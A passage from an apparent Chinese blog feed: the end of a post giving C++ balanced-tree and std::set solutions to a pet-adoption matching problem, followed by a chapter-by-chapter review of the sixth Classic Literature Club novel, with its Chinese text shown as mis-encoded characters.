class=\"comment\">//æŸ¥è¯¢ä¸æ¯”xå°çš„ä¸”æœ€æ¥è¿‘xçš„æ•°æ‰€åœ¨ä½ç½®ï¼ˆxåç»§ï¼‰</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(k==<span class=\"number\">0</span>)<span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(T[k].val&gt;x) ANS=k,<span class=\"built_in\">next</span>(T[k].ch[<span class=\"number\">0</span>],x);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"built_in\">next</span>(T[k].ch[<span class=\"number\">1</span>],x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Catch</span><span class=\"params\">(<span class=\"type\">int</span> num)</span><span class=\"comment\">//åŒ¹é…å® ç‰©å’Œé¥²å…»äºº</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> a,b;</span><br><span class=\"line\">    <span class=\"built_in\">pre</span>(k,num),a=T[ANS].val; </span><br><span class=\"line\">    <span class=\"built_in\">next</span>(k,num), b=T[ANS].val;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(num-a&lt;=b-num &amp;&amp; a != -INF) &#123;</span><br><span class=\"line\">            ans += num-a;</span><br><span class=\"line\">            <span class=\"built_in\">del</span>(k,a);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            ans += b-num;</span><br><span class=\"line\">            <span class=\"built_in\">del</span>(k,b);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ans %= <span class=\"number\">1000000</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;n);</span><br><span class=\"line\">        <span class=\"type\">int</span> cur;</span><br><span class=\"line\">        <span class=\"built_in\">ins</span>(k,-INF),<span class=\"built_in\">ins</span>(k,INF);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">1</span>; i &lt;= n; i++) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> a, b;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(T[k].size == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                cur=a;<span class=\"comment\">//curï¼šå½“å‰æ˜¯å® ç‰©ç­‰äººè®¤é¢†è¿˜æ˜¯äººåœ¨ç­‰ç€æ¥å—å® ç‰©ï¼ˆçœ‹åŸé¢˜ï¼Œä¸ç„¶è°çœ‹å¾—æ‡‚å•Š= =ï¼‰</span></span><br><span class=\"line\">                <span class=\"built_in\">ins</span>(k,b);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a == cur) <span class=\"built_in\">ins</span>(k,b);</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"built_in\">Catch</span>(b);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, ans);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```  </span><br><span class=\"line\"><span class=\"number\">2.</span> setå®ç°(<span class=\"number\">304</span>ms,<span class=\"number\">2.57</span>MB)  </span><br><span class=\"line\">```cpp</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cmath&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctime&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;set&gt;</span> </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> maxn = <span class=\"number\">1111111</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> INF = <span class=\"number\">1000000000</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> n, ans;</span><br><span class=\"line\">set &lt;<span class=\"type\">int</span>&gt; s;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"type\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">    set&lt;<span class=\"type\">int</span>&gt;::iterator left=--s.<span class=\"built_in\">lower_bound</span>(x),right=s.<span class=\"built_in\">lower_bound</span>(x);<span class=\"comment\">//lower_boundçš„å®ç°æ˜¯äºŒåˆ†æŸ¥æ‰¾ï¼Œè¿­ä»£å™¨æŒ‡å‘ä¸æ¯”xå°çš„ä¸”æœ€æ¥è¿‘xçš„æ•°çš„ä½ç½®ï¼Œæ‰€ä»¥leftå°±æ˜¯å‰ç»§ï¼Œrightå°±æ˜¯åç»§</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x-*left&lt;=*right-x&amp;&amp;*left!=-INF) &#123;</span><br><span class=\"line\">        ans+=x-*left;</span><br><span class=\"line\">        s.<span class=\"built_in\">erase</span>(left);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ans+=*right-x;</span><br><span class=\"line\">        s.<span class=\"built_in\">erase</span>(right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ans%=<span class=\"number\">1000000</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;n);</span><br><span class=\"line\">    <span class=\"type\">int</span> cur;</span><br><span class=\"line\">    s.<span class=\"built_in\">insert</span>(-INF),s.<span class=\"built_in\">insert</span>(INF);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a,b;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s.<span class=\"built_in\">size</span>()==<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            cur=a;</span><br><span class=\"line\">            s.<span class=\"built_in\">insert</span>(b);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a==cur) s.<span class=\"built_in\">insert</span>(b);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"built_in\">find</span>(b);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, ans);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n",
            "tags": [
                "Treap",
                "Splay"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/",
            "url": "http://cubicy.icu/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/",
            "title": "å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—ç¬¬6éƒ¨ã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹è¯»åæ„Ÿâ€¦â€¦å—ï¼Ÿ",
            "date_published": "2018-03-15T14:58:00.000Z",
            "content_html": "<h3 id=\"å‰è¨€\"><a href=\"#å‰è¨€\" class=\"headerlink\" title=\"å‰è¨€\"></a>å‰è¨€</h3><p>å‡†å¤‡çœ‹ä¹‹å‰ï¼Œæˆ‘ç•™æ„åˆ°è¿™æœ¬ä¹¦ä¸å‰å‡ æœ¬æœ‰äº›è®¸ä¸åŒã€‚<br>è‹±æ–‡çš„å‰¯æ ‡é¢˜æ¶ˆå¤±äº†ã€‚å°é¢çš„é…å›¾æ˜¯å¤©å°ï¼Œæ˜¯ä¸€ç§ç”ŸåŠ¨æ˜æ™°çš„è‰²å½©å§ã€‚å¤©ç©ºä¸å¤©å°æŸ“ä¸Šç»¿è‰²è°ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆä»¤æˆ‘ç•™æ„äº†è®¸ä¹…ã€‚<br>ä¸»è¦è¿˜æ˜¯å°åº•çš„æ–‡å­—ä»¤æˆ‘å¾ˆåœ¨æ„ï¼šä¹‹å‰å‡ æœ¬éƒ½åªæ˜¯åœ¨æ­¤æŠ›å‡ºæ‚¬å¿µ&#x2F;ç–‘é—®ï¼Œä»¤è¯»è€…äºä¹¦ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œè€Œè¿™é‡Œå´åœ¨åé¢é™„ä¸Šäº†è¿™æ ·çš„æ–‡å­—ï¼š<br><strong>â€œå…¨ä¹¦åˆ†ä¸ºå…­ä¸ªçŸ­ç¯‡ï¼Œåœ¨å……æ»¡æ´»åŠ›åˆå¸¦ç‚¹è‹¦æ¶©çš„æ•…äº‹é‡Œï¼Œå¤ç±ç ”ç©¶ç¤¾å››åæˆå‘˜çš„è¿‡å»å’Œæœªæ¥ä¹Ÿé€æ¸æ˜æœ—â€¦â€¦â€</strong><br>è¯­æ°”åº”è¯¥å¾ˆå¹³æ·¡å§ï¼Œä½†æ˜¯ä»¿ä½›ä¸€ç›´åœ¨æš—ç¤ºæˆ‘è¿™ä¸€éƒ¨ä¸ç®€å•ã€‚è¿™å¥è¯åœ¨è¯•å›¾ä¼ è¾¾ç€ä»€ä¹ˆå—ï¼Ÿå·²ç»ç¡®å®šäº†å…¨ä¹¦çš„åŸºè°ƒå—ï¼Ÿ<br><strong>æˆ‘å¾ˆå¥½å¥‡ã€‚</strong>  </p>\n<h3 id=\"æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹\"><a href=\"#æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹\" class=\"headerlink\" title=\"æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹\"></a>æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹</h3><p>æ¡ˆä»¶æœ¬èº«ä¸å¤æ‚ã€‚æŠ•ç¥¨çš„ç¥¨æ•°æ¯”äººæ•°å¤šï¼Œäºæ˜¯é‡Œå¿—å‘æŠ˜æœ¨æ±‚åŠ©ã€‚åœ¨2äººçš„æ•£æ­¥ä¸å¯¹è¯ä¸­ï¼ŒçœŸç›¸é€æ¸æµ®å‡ºæ°´é¢ã€‚å›æœ›åŒç³»åˆ—ç¬¬5éƒ¨ã€Šä¸¤äººè·ç¦»çš„æ¦‚ç®—ã€‹ï¼Œå…¨ä¹¦ç”¨æŠ˜æœ¨äºâ€œæ˜Ÿè°·æ¯â€é•¿è·‘ä¸­çš„æ€è€ƒä¸²è”ï¼Œæ­¤å¤„æ‰‹æ³•ä¸å…¶é¢‡ä¸ºç›¸ä¼¼ã€‚<br><strong>å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„æ•…äº‹å¾€å¾€ä¸åœ¨æ¡ˆä»¶æœ¬èº«ã€‚</strong><br>æƒ³æƒ³å°åº•çš„è¯ï¼Œä¸éš¾çŒœåˆ°æ­¤å¤„å†™çš„æ˜¯é‡Œå¿—çš„è½¬å˜ã€‚ç¬¬ä¸‰éƒ¨ã€Šåº“ç‰¹åˆ©äºšèŠ™å¡çš„é¡ºåºã€‹ä¸­ï¼Œé‡Œå¿—æ€»æ˜¯å¿µå¨ç€â€œæ•°æ®åº“æ˜¯å¾—ä¸å‡ºç»“è®ºçš„â€è¿™æ ·çš„è¯ã€‚ï¼ˆé¡ºå¸¦ä¸€æï¼Œç¬¬ä¸‰éƒ¨å¯¹å››äººçš„å½¢è±¡åˆ»ç”»å¾ˆç”ŸåŠ¨ï¼Œä¸ªäººå¾ˆå–œæ¬¢ã€‚ï¼‰ç„¶è€Œä¹‹æ‰€ä»¥ä¸€ç›´å¿µå¨ï¼Œæƒ³å¿…ä¹Ÿæ˜¯å› ä¸ºæœ¬äººä¸ç”˜å¿ƒâ€”â€”å°½ç®¡é‚£æ—¶é‡Œå¿—ä¹Ÿè¯•ç€æ¨ç†ï¼Œä¸è¿‡ä»–å‘ç°è‡ªå·±åšä¸åˆ°ã€‚è€Œåœ¨æ­¤ï¼Œé‡Œå¿—æ˜æ˜¾æ¥å—äº†è‡ªå·±æ²¡æœ‰æŠ˜æœ¨é‚£æ ·çš„æ‰èƒ½çš„äº‹å®ï¼Œæ€æƒ³ä¸Šå·²ç»åšäº†è½¬å˜ï¼Œä»–ä¾æ—§æ˜¯é‚£ä¸ªåœ¨è¡—æœºæ¸¸æˆä¸­è¾“äº†ä¹Ÿç¬‘å¾—ç¿çƒ‚çš„é‡Œå¿—ã€‚ä¸è¿‡é‡Œå¿—å¯¹å…¬å¹³æ­£ä¹‰çš„æ‰§ç€ã€å¯¹è‡ªå·±è®¤ä¸ºæ­£ç¡®çš„äº‹ç‰©çš„åšæŒä»æœªæ”¹å˜ã€‚è‹¥éå¦‚æ­¤ï¼Œä»–ä¾¿ä¸ä¼šä¸ºå­¦å¼Ÿæ‰“æŠ±ä¸å¹³ï¼Œä¾¿ä¸ä¼šå»è¯·æ±‚æŠ˜æœ¨è§£è°œã€‚å˜ä¸ä¸å˜ï¼ŒæŠŠé‡Œå¿—å½¢è±¡åˆ»ç”»çš„æä¸ºé²œæ˜ã€‚è¿™ä¸ªæ•…äº‹çœŸæ­£æƒ³è¦è¡¨è¾¾çš„æ˜¯è¿™æ ·å§ã€‚</p>\n<h3 id=\"æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹\"><a href=\"#æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹\" class=\"headerlink\" title=\"æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹\"></a>æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹</h3><p>ç”¨æ‘©è€¶èŠ±çš„è§†è§’æ¢å¯»æŠ˜æœ¨çš„è¿‡å»â€”â€”æœ‰æ„æ€çš„è§†è§’ã€‚æ—©å·²ç–‘æƒ‘æ‘©è€¶èŠ±ä¹‹å‰ä¸ºä»€ä¹ˆä¼šè®¨åŒæŠ˜æœ¨ï¼Œæœ¬ç¯‡åˆ™è¿›è¡Œäº†è§£ç­”ï¼Œæ¯•ç«Ÿå¤ç±ç ”ç©¶ç¤¾ç³»åˆ—å‘æ¥æ˜¯é‡ç‚¹åœ¨äºæ¡ˆä»¶èƒŒåã€‚ä»–çš„åˆä¸­åŒå­¦ä»¬ä¼šè®¨åŒä»–ä»…ä»…æ˜¯å› ä¸ºä¸€æ¬¡è¯¯ä¼šï¼Œè€ŒæŠ˜æœ¨é€‰æ‹©äº†æ²‰é»˜ã€‚åœ¨æ‘©è€¶èŠ±çš„å¥½å¥‡å¿ƒé©±ä½¿ä¸‹ï¼Œç»ˆäºäº†è§£äº†æŠ˜æœ¨æ‰€ä½œæ‰€ä¸ºçš„åŸå› ã€‚åœ¨æ‘©è€¶èŠ±é“æ­‰ä¹‹åï¼ŒæŠ˜æœ¨çœ‹ä¼¼æ¼«ä¸ç»å¿ƒï¼Œä½†æ˜¯ä¸€å¥â€œæŠ˜æœ¨çš„è§†çº¿æ¸¸ç§»ä¸å®šâ€çš„æå†™å±•ç°äº†ä»–å†…å¿ƒçš„æ·±å—è§¦åŠ¨ã€‚è¿™ä¸€ç¯‡æ•…äº‹åˆ»ç”»äº†æŠ˜æœ¨åšå¥½äº‹ä¸ç•™åçš„â€œè‹±é›„â€å½¢è±¡ï¼Œå…¶å®ä¹Ÿä¾§é¢åæ˜ äº†æŠ˜æœ¨æœ¬èº«å¹¶ä¸æ¶ˆæã€‚æŠ˜æœ¨éª¨å­é‡Œå’Œé‡Œå¿—æ˜¯ä¸€æ ·çš„ï¼Œåƒåç”°åªæ˜¯å”¤é†’äº†ä»–çš„æ¿€æƒ…ã€‚ä¸ªäººè®¤ä¸ºæ­¤æ–‡æ¶‰åŠåˆ°äº†æ ¡å›­æ¬ºå‡Œï¼Œä»æ—è§‚è€…çš„è§’åº¦å‡ºå‘å±•ç°äº†æ ¡å›­â€œå†·æš´åŠ›â€çš„å¯æ€•ã€‚æ—è§‚è€…ä¸åº”æ—è§‚ã€‚è‹¥ç›´æ¥ä»‹å…¥ä¸å¦¥ï¼Œæš—ä¸­å¸®åŠ©ä¸å¤±ä¸ºä¸€ç§å¥½æ–¹æ³•â€”â€”ç±³æ³½ç©—ä¿¡ä¹Ÿè®¸æƒ³ä¼ è¾¾çš„æ˜¯è¿™ä¸ªã€‚<br>ä¸å¾—è§çš„ï¼ŒçœŸçš„åœ¨é•œä¸­å—ï¼Ÿ</p>\n<h3 id=\"æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹\"><a href=\"#æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹\" class=\"headerlink\" title=\"æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹\"></a>æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹</h3><p>æŠ˜æœ¨æ¢æ˜äº†å®é™…ä¸Šä¸å–œæ¬¢ç›´å‡æœºçš„è€å¸ˆåœ¨æŸæ—¥æ—©æ™¨è¯´å‡ºâ€œæˆ‘å–œæ¬¢ç›´å‡æœºâ€çš„ç¼˜ç”±ã€‚çœ‹åˆ°ä¸€åŠçš„æ—¶å€™å…¶å®å¤§éƒ¨åˆ†äººä¾¿éƒ½èƒ½æ¨¡æ¨¡ç³Šç³ŠçŒœåˆ°ç¼˜ç”±äº†ã€‚å½“ç„¶é‡ç‚¹ä¾æ—§ä¸åœ¨æ¡ˆä»¶ä¸Šã€‚<br><strong>æŠ˜æœ¨è¯´å‡ºâ€œæˆ‘å¾ˆå¥½å¥‡â€</strong>çš„æ—¶å€™ï¼Œæ— è®ºé‡Œå¿—ã€åƒåç”°ã€æ‘©è€¶èŠ±è¿˜æ˜¯è¯»è€…éƒ½ä¼šå¤§åƒä¸€æƒŠå§ã€‚è¿™åˆ™æ•…äº‹ä¸é•¿ï¼Œåƒæ˜¯ä¸€ç§è¿‡æ¸¡ã€‚ç„¶è€Œè¯´åˆ°è¿‡æ¸¡å°±ä¼šæƒ³åˆ°è½¬å˜â€”â€”èŠ‚èƒ½ä¸»ä¹‰çš„æŠ˜æœ¨å¼€å§‹æ¸´æœ›æœ¬ä¹¦ä¸­æ‰€è¯´çš„â€œç«ç‘°è‰²çš„äººç”Ÿâ€ã€‚æŸç§ç¨‹åº¦ä¸Šï¼ŒæŠ˜æœ¨å·²ç»æ”¾å¼ƒäº†èŠ‚èƒ½ä¸»ä¹‰ã€‚åƒåç”°æ˜¯å¼•å­ï¼Œæ ¹æœ¬åŠ¨åŠ›æ˜¯åŒé‡Œå¿—ä¸€æ ·çš„ã€å†…å¿ƒæ·±å¤„å¯¹æŸäº›ä¸œè¥¿çš„æ‰§ç€å’Œæ¸´æœ›ã€‚<br>æˆ‘ç›¸ä¿¡é‡Œå¿—åœ¨æ•´ä¸ªç³»åˆ—ä¸­æ›´åƒæ˜¯æŠ˜æœ¨çš„çœŸæˆ‘ä¹‹ä½“ç°ã€‚é€šè¿‡ä¸¤äººè¡¨ç°çš„å·®å¼‚ï¼Œä¾¿èƒ½çœ‹å‡ºæŠ˜æœ¨è·ç¦»çœŸæ­£çš„è‡ªæˆ‘è¿˜æœ‰å¤šè¿œã€‚è¿™æ˜¯æˆ‘å¯¹é‡Œå¿—çš„ç†è§£ï¼šæŠ˜æœ¨å†…å¿ƒçš„é•œåƒã€‚</p>\n<h3 id=\"æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹\"><a href=\"#æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹\" class=\"headerlink\" title=\"æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹\"></a>æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹</h3><p>æ‘©è€¶èŠ±çš„è§†è§’ã€‚çœŸç›¸çš„æ­ç¤ºè€…å°±æ˜¯â€œå‡¶æ‰‹â€æœ¬äººï¼Œååˆ†æœ‰è¶£ã€‚æœ¬æ–‡æ¢è®¨äº†ä¸€ä¸ªé—®é¢˜ï¼š<strong>ä¸ªä½“åœ¨é›†ä½“ä¹‹ä¸­ï¼Œåº”è¯¥ä¸ºäº†é›†ä½“çš„åˆ©ç›Šè€Œç‰ºç‰²è‡ªå·±ï¼Œè¿˜æ˜¯åº”è¯¥ä¸ºäº†è‡ªå·±çš„å‰é€”è€Œæ”¾å¼ƒé›†ä½“ï¼Ÿ</strong><br>æ²³å†…å­¦å§è‡ªå·±é€€å‡ºæ¼«ç ”ï¼Œå´å®‰æ’ç¾½ä»æ‹…ä»»ç¤¾é•¿ï¼Œæ€å¯è°“æ”¾ä¸‹ï¼Ÿè€Œå…¶åŠæ‘©è€¶èŠ±é€€å‡ºä¹Ÿæ˜¯ä¸ºäº†æ¼«ç ”ä¸æ‘©è€¶èŠ±çš„åˆ©ç›Šæœ€å¤§åŒ–ã€‚ç°å®ç”Ÿæ´»å¾€å¾€ä¸ä¼šå‡ºç°æ•…äº‹ä¸­æ¼«ç ”å®Œå…¨ä¸¤æåˆ†åŒ–çš„æƒ…å†µã€‚æ— è®ºåšå‡ºä»€ä¹ˆé€‰æ‹©ï¼Œæ€»æœ‰äººè¦å—ä¼¤ã€‚å› æ­¤ï¼Œæˆ‘æ›´å€¾å‘äºéµå¾ªè‡ªå·±çš„æœ¬å¿ƒã€‚æ‘©è€¶èŠ±çš„é€‰æ‹©ä¹Ÿè®¸ä¸ä¸€å®šæ­£ç¡®ï¼Œæ›´æœ‰å¯èƒ½æ ¹æœ¬æ— å¯¹é”™ä¹‹åˆ†ï¼Œä½†å¥¹è‡³å°‘éµä»äº†è‡ªå·±çš„æœ¬å¿ƒã€‚  </p>\n<h3 id=\"æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹\"><a href=\"#æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹\" class=\"headerlink\" title=\"æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹\"></a>æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹</h3><p>è¿™åˆ™æ•…äº‹è¯¦ç»†è¯´æ˜äº†æŠ˜æœ¨æˆä¸ºèŠ‚èƒ½ä¸»ä¹‰è€…çš„åŸå› ã€‚æ•…äº‹çš„ç»“å°¾å€ŸæŠ˜æœ¨çš„å§å§ä¹‹å£è¯´äº†è¿™ä¹ˆä¸€å¥è¯ï¼š<br><strong>â€œä»Šåä½ ä¼šè¿æ¥æ‚ é•¿çš„å‡æœŸï¼Œè¿™æ ·ä¹Ÿå¥½ï¼Œä½ å°±å¥½å¥½ä¼‘æ¯å§ï¼Œæ²¡é—®é¢˜ï¼Œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜ã€‚â€</strong><br>è¿™é‡Œçš„â€œæ‚ é•¿å‡æœŸâ€å…¶å®æ˜¯<strong>ä¸€è¯­ä¸‰å…³</strong>ï¼Œæ—¢å®æŒ‡æŠ˜æœ¨å³å°†è¿æ¥çš„æ¼«é•¿æš‘å‡ï¼Œä¹Ÿæš—æŒ‡æŠ˜æœ¨ä¹‹åæ¼«æ¼«æ— æœŸçš„èŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ï¼Œæ›´æŒ‡çš„æ˜¯å†…å¿ƒçš„ç¼“æ…¢æ”¹å˜ã€‚â€œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜â€ï¼Œæš—å–»äº†æŠ˜æœ¨å³å°†å˜æˆä¸€ä¸ªèŠ‚èƒ½ä¸»ä¹‰è€…ï¼ŒèŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ä¸­å†…å¿ƒå´å¹¶ä¸åšå®šï¼Œç»ˆå°†è½¬å˜æ€æƒ³ã€‚æ•…äº‹æœ€ååˆåŠ äº†ä¸€å¥ï¼šâ€œä¹Ÿä¼šæœ‰äººæ¥ç»“æŸä½ è¿™æ‚ é•¿çš„å‡æœŸã€‚â€è¯´æ˜æš‘å‡ç»ˆå°†è¿‡å»ï¼ŒèŠ‚èƒ½ä¸»ä¹‰çš„ç”Ÿæ´»å°†ä¸å†ï¼Œå†…å¿ƒæœ€ç»ˆä¹Ÿä¼šå®Œæˆè½¬å˜ï¼Œæ›´åŠ æˆç†Ÿã€‚ç±³æ³½ç©—ä¿¡åˆ»æ„å®‰æ’æŠ˜æœ¨å’Œåƒåç”°äºŒäººåœ¨è¿™ä¸ªæ•…äº‹é‡Œäº’åŠ¨ï¼Œä¼ è¾¾ç€æ‰€è°“çš„â€œæœ‰äººâ€å°±æ˜¯åƒåç”°ï¼Œæœ¬æ–‡æ˜¯å®˜æ–¹å‘ç³–çš„é“ºå«ä¹‹ä¸€ã€‚  </p>\n<h3 id=\"æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹\"><a href=\"#æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹\" class=\"headerlink\" title=\"æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹\"></a>æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹</h3><p>ä¸ç®€å•çš„ä¸€éƒ¨ä¹¦çš„æœ€åä¸€ç« ï¼Œä¸”æ ‡é¢˜å’Œä¹¦çš„æ ‡é¢˜ç›¸åŒï¼Œæš—ç¤ºç€å…¶åˆ†é‡ä¹‹é‡ã€‚ç±³æ³½ç©—ä¿¡æ›´ä¸ºç”¨å¿ƒåœ°å»åˆ»ç”»äº†äººç‰©å½¢è±¡ã€‚ç¯‡å¹…ä¸Šç¨é•¿ï¼Œæ•…äº‹çš„æ¶æ„å’Œç«‹æ„æ›´æ˜¯é«˜æ˜ï¼Œå…·å¤‡ä¸°å¯Œçš„æˆå‰§æ€§å’Œæ€æƒ³ã€‚å‰é¢å‡ ä¸ªæ•…äº‹éƒ½æ˜¯åœ¨è®²æŠ˜æœ¨ã€ç¦éƒ¨å’Œä¼ŠåŸï¼Œæœ€åä¸€ä¸ªè‡ªç„¶ç•™ç»™äº†åƒåç”°çˆ±ç‘ ã€‚<br>â€œæ¡ˆä»¶â€çš„èµ·å› æ˜¯æœ‰ä¸€å¤©åƒåç”°çš„çˆ¶äº²çªç„¶å‘Šè¯‰å¥¹ä¸ä¸€å®šè¦å†ç»§æ‰¿å®¶ä¸šäº†ã€‚æ¯”å–»ä¸ºä¸€é“é€‰æ‹©é¢˜çš„è¯ï¼Œâ€œä¸å¿…é¡»â€å°±æ„å‘³ç€å³å¯ç”¨é€‰ç»§æ‰¿å®¶ä¸šï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸ç»§æ‰¿ï¼Œå› 